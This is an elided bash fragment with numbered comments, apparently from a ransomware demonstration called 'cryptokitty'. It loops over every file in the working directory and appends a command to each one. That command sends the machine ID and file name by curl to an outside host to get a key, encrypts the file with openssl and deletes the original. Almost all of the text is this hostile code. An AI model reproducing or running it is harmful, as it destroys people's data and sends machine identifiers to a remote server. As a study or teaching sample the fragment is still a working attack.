...
for target in *; do #@7 for every file in the working dir
	...
	tail -n 38 $target | awk '{print($NF" "$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > /tmp/\ /"$NEWFILE" #@15 
	...
	echo "[ -f "$target" ] && [[ "${target##*\\.}" != "*.cryptokitty" ]] && key=\"\$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$target)\" && openssl enc -aes-256-cbc -in "$target" -k \"\$key\" -out "$target.cryptokitty" && rm "$target"; exit 0" >> $target #@24 append the command exit 0 at the end of our file	
